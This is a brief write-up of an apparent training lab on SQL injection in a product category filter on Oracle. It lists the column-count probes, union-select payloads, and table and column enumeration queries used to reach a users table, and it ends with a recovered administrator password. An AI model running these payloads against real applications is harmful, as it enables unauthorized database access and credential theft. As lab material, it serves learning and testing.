Lab: SQL injection attack, listing the database contents on Oracle
Vuln : SQLi in product category filter.
Task : FInding usernames and passwords.

DB : Oracle

' order by 1--
' order by 2--
' order by 3-- : Error -> 2 cols in table

' union select 'a',null from dual--
' union select 'a','a' from dual--

' union select table_name,null from all_tables--
table name : `USERS_GTEVZI`

SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS_GTEVZI' 

USERNAME_GIFLDE
PASSWORD_PTVWOP

administrator
8enutq6fmgitp474fh3q